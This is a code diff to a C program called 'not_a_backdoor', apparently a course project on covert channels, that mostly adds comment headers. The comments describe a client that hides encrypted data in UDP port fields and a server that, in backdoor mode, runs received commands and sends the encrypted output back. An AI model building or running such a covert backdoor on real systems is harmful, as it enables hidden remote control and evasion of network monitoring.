@@ -1,5 +1,28 @@
-// ./not_a_backdoor -dest 192.168.1.72 -source 192.168.1.71 -dest_port 323 -backdoor
-// ./not_a_backdoor -dest 192.168.1.72 -source 192.168.1.71 -dest_port 323
+/*---------------------------------------------------------------------------------------
+ * SOURCE FILE:	    not_a_backdoor
+ * 
+ * PROGRAM:		    not_a_backdoor
+ * 
+ * FUNCTIONS:		
+ *                  
+ * 
+ * DATE:			October  27, 2021
+ * 
+ * REVISIONS:		NA
+ * 
+ * DESIGNERS:       Nicole Jingco
+ * 
+ * PROGRAMMERS:		Nicole Jingco
+ * 
+ * Notes:
+ * this module will contain the 
+ * 
+ * Backdoor Usage Example:
+ * ./not_a_backdoor -dest 192.168.1.72 -source 192.168.1.71 -dest_port 323 -backdoor
+ * 
+ * Client Usage Example:
+ * ./not_a_backdoor -dest 192.168.1.72 -source 192.168.1.71 -dest_port 323
+ * ---------------------------------------------------------------------------------------*/
 #include "not_a_backdoor.h"
 
 int main(int argc, char **argv)
@@ -123,9 +146,9 @@ int main(int argc, char **argv)
 }
 
 /*--------------------------------------------------------------------------
- * FUNCTION:        forgepacket
+ * FUNCTION:       forgepacket
  *
- * DATE:           NA
+ * DATE:           October 28, 2021
  *
  * REVISIONS:      NA
  * 
@@ -133,12 +156,15 @@ int main(int argc, char **argv)
  *
  * PROGRAMMER:     Nicole Jingco
  *
- * INTERFACE:      unsigned int source_addr, unsigned int dest_addr, unsigned short source_port, unsigned short dest_port, char *filename, int server, int ipid, int seq, int ack
+ * INTERFACE:      unsigned char *ciphertext - where the encrypted data is stored
+ *                 char *buff - data
+ *                 int size - size of buffer
  *
  * RETURNS:        
  *
  * NOTES:
- * This section runs client or the server code if server flag was set
+ * This section exrypts the data and returns the encrypted data length. 
+ * The encrypted data will be stored 
  * -----------------------------------------------------------------------*/
 int forgepacket(unsigned char *ciphertext, char *buff, int size)
 {
@@ -147,9 +173,28 @@ int forgepacket(unsigned char *ciphertext, char *buff, int size)
     return ciphertext_len;
 }
 
+/*--------------------------------------------------------------------------
+ * FUNCTION:       getInput
+ *
+ * DATE:           October 28, 2021
+ *
+ * REVISIONS:      NA
+ * 
+ * DESIGNER:       Nicole Jingco
+ *
+ * PROGRAMMER:     Nicole Jingco
+ *
+ * INTERFACE:      NA
+ *
+ * RETURNS:        char * - user input
+ *
+ * NOTES:
+ * This function gets the input from the user are returns it as a 
+ * character pointer
+ * -----------------------------------------------------------------------*/
 char *getInput()
 {
-    // // GET COMMAND INPUT
+    // GET COMMAND INPUT
     char *commandBuffer = (char *)malloc(BUFF_SIZE);
     memset(commandBuffer, 0, BUFF_SIZE);
 
@@ -163,7 +208,7 @@ char *getInput()
 /*--------------------------------------------------------------------------
  * FUNCTION:       client
  *
- * DATE:           Sep 20, 2021
+ * DATE:           October 28, 2021
  *
  * REVISIONS:      NA
  * 
@@ -171,13 +216,17 @@ char *getInput()
  *
  * PROGRAMMER:     Nicole Jingco
  *
- * INTERFACE:      unsigned int source_addr, unsigned int dest_addr, unsigned short dest_port, char *filename, int ipid
+ * INTERFACE:      unsigned int source_addr - source address
+ *                 unsigned int dest_addr - destination address
+ *                 unsigned short dest_port - destination port
+ *                 unsigned char *data - encrypted data
+ *                 int data_len - length of encrypted data
  *
  * RETURNS:        NA
  *
  * NOTES:
  * Client function for consealing the message using the UDP header and
- * hiding the message in the port number
+ * hiding the message in the port number.
  * -----------------------------------------------------------------------*/
 void client(unsigned int source_addr, unsigned int dest_addr, unsigned short dest_port, unsigned char *data, int data_len)
 {
@@ -264,7 +313,7 @@ void client(unsigned int source_addr, unsigned int dest_addr, unsigned short des
 /*--------------------------------------------------------------------------
  * FUNCTION:       server
  *
- * DATE:           Sep 20, 2021
+ * DATE:           October 28, 2021
  *
  * REVISIONS:      NA
  * 
@@ -272,13 +321,18 @@ void client(unsigned int source_addr, unsigned int dest_addr, unsigned short des
  *
  * PROGRAMMER:     Nicole Jingco
  *
- * INTERFACE:      unsigned int source_addr, char *filename, int ipid
+ * INTERFACE:      unsigned int source_addr - source address
+ *                 unsigned int dest_addr - destination address
+ *                 unsigned short dest_port - destination port
+ *                 bool isBackdoor - if true, it is running as a backdoor 
+ *                                  and will execute received data
  *
  * RETURNS:        NA
  *
  * NOTES:
- * Server function for unvealing the message from the UDP header and
- * writing the the message to a file.
+ * Server function for unvealing the message from the UDP header from the 
+ * source port. If it is a backdoor it will executes the command, encryp 
+ * the output and call the client function to send the data back.
  * -----------------------------------------------------------------------*/
 void server(unsigned int source_addr, unsigned int dest_addr, unsigned short dest_port, bool isBackdoor)
 {
@@ -467,6 +521,24 @@ unsigned int host_convert(char *hostname)
     return i.s_addr;
 }
 
+/*--------------------------------------------------------------------------
+ * FUNCTION:       usage
+ *
+ * DATE:           October 28, 2021
+ *
+ * REVISIONS:      NA
+ * 
+ * DESIGNER:       Nicole Jingco
+ *
+ * PROGRAMMER:     Nicole Jingco
+ *
+ * INTERFACE:      NA
+ *
+ * RETURNS:        NA
+ *
+ * NOTES:
+ * This function prints the program usage
+ * -----------------------------------------------------------------------*/
 void usage(char *progname)
 {
     printf("Covert UDP usage: \n%s -dest dest_ip -source source_ip -source_port port -dest_port port -backdoor \n\n", progname);
